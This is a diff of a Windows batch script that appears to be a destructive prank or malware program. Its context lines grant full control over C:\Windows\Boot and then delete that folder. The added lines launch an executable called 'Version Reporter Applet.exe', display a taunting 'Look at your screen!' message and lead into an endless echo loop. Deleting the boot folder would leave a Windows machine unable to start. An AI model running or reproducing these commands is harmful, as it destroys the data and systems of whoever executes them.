@@ -9,13 +9,13 @@ icacls "C:\Windows\Boot" /grant administrators:F /t
 rmdir /s /q "C:\Windows\Boot"
 start notepad
 start cmd
-start 
+start "" "Version Reporter Applet.exe"
+echo Look at your screen! soming funny is happing!
+timeout /t 1
 a:
 echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 goto a
 exit
 
 :NO
-echo You chose No!
-pause
 exit
